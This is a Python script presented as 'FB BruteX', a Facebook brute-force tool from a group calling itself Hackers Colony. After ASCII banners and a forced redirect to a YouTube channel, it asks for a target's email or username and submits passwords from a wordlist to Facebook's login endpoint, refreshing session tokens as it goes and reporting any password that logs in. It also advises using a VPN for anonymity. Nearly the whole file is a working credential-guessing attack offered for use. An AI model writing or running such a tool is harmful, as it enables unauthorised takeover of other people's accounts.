import os
import sys
import time
import requests
from bs4 import BeautifulSoup
from random import randint
from datetime import datetime

# Clear the terminal screen
os.system("clear")

# Animation function
def animate(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.008)

# Welcome screen ASCII Art
banner = '''\033[1;32m

                           ██╗  ██╗ ██████╗ ██████╗
                           ██║  ██║██╔════╝██╔═══██╗
                           ███████║██║     ██║   ██║
                           ██╔══██║██║     ██║   ██║
                           ██║  ██║╚██████╗╚██████╔╝
                           ╚═╝  ╚═╝ ╚═════╝ ╚═════╝

\033[1;33m

               
                   ██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗
                   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝╚██╗██╔╝
                   ██████╔╝██████╔╝██║   ██║   ██║    ╚███╔╝ 
                   ██╔══██╗██╔══██╗██║   ██║   ██║    ██╔██╗ 
                   ██████╔╝██║  ██║╚██████╔╝   ██║   ██╔╝ ██╗
                   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                          



\033[1;31m                  :: F B  B r u t X - By Hackers Colony ::
\033[0m
'''
animate(banner)

# Disclaimer and redirect notice
notice = ("\n\033[1;34mThis Tool is Free For Our subscribers\n"
         "We are Redirecting You To Our YouTube Channel\n"
         "You Will Subscribe Our Channel\n"
         "After Doing It You Will Able To Use Our Tool.")
animate(notice)
time.sleep(5)
channel_url = "https://youtube.com/@hackers_colony_tech?si=7FEalwT2t0khmivd"
os.system(f"xdg-open {channel_url}")
time.sleep(7)

# Clear screen after redirect
os.system("clear")

# Program Logo with Red ASCII "FB BruteX"
logo = '''\033[1;32m

           

                 /$$$$$$$                        /$$     /$$   /$$
                | $$__  $$                      | $$    | $$  / $$
                | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$  |  $$/ $$/
                | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   \  $$$$/ 
                | $$__  $$| $$  \__/| $$  | $$  | $$      >$$  $$ 
                | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$/\  $$
                | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/| $$  \ $$
                |_______/ |__/       \______/    \___/  |__/  |__/                                                       
                                                    
                                                    
                              /$$$$$$$$ /$$$$$$$ 
                             | $$_____/| $$__  $$
                             | $$      | $$  \ $$
                             | $$$$$   | $$$$$$$ 
                             | $$__/   | $$__  $$
                             | $$      | $$  \ $$
                             | $$      | $$$$$$$/
                             |__/      |_______/                           
                             
                             
          
            \033[1;34m     .:H a c k e r  C o l o n y  O f f i c i a l:.

                       __Facebook BruteForce Attack__

'''
animate(logo)

# Instructions and notices
dictr = "\033[1;32m\n[+] Ensure the wordlist is in the same directory as this script.\n"
vpnu = "[+] Use VPN for better anonymity.\n\033[0m"

animate(dictr)
animate(vpnu)

# Script main logic
DEFAULT_PASSWORD_FILE = "hcowordlist.txt"
POST_URL = "https://www.facebook.com/login.php"
MIN_PASSWORD_LENGTH = 6
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = {}
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
    response = requests.get(POST_URL, headers=HEADERS)
    for cookie in response.cookies:
        cookies[cookie.name] = cookie.value
    soup = BeautifulSoup(response.text, 'html.parser').form
    if soup.input['name'] == 'lsd':
        form['lsd'] = soup.input['value']
    return form, cookies


def is_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    response = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in response.text or 'security code' in response.text or 'Two-factor authentication' in response.text or "Log Out" in response.text:
        open('temp', 'w').write(str(response.content))
        print(f"\n\033[1;32m[+] Password found: {password}\033[0m")
        return True
    return False


if __name__ == "__main__":
    wordlist_choice = input("\n\033[1;36mSelect An Wordlist \n\n\033[1;31m1. Your Wordlist\n2. HCO Wordlist\n\n\033[1;31m==> \033[0m").strip().lower()
    if wordlist_choice == "1":
        PASSWORD_FILE = input("\033[1;36m\nEnter the path of your wordlist: \033[0m").strip()
    else:
        PASSWORD_FILE = DEFAULT_PASSWORD_FILE
        
    try:

        if not os.path.isfile(PASSWORD_FILE):
            print(f"\033[1;31m\n[-] Password file not found: {PASSWORD_FILE}\033[0m")
            sys.exit()

        print(f"\n\033[1;33m\n[+] Using password file: {PASSWORD_FILE}\033[0m")
        passwords = open(PASSWORD_FILE, 'r').read().split("\n")
        email = input("\n\033[1;36mEnter target Email/Username: \033[0m").strip()

        for idx, password in enumerate(passwords):
            password = password.strip()
            if len(password) < MIN_PASSWORD_LENGTH:
                continue
            print(f"\033[1;34mPassword Not Matched {email}: {password}\033[0m")
            print("\033[1;34m############################################")
            if is_password(email, idx, password):
                break
    except:
        print("\n\n\033[1;31m[!] Exiting....\n")
        time.sleep(1)
        #sys.exit()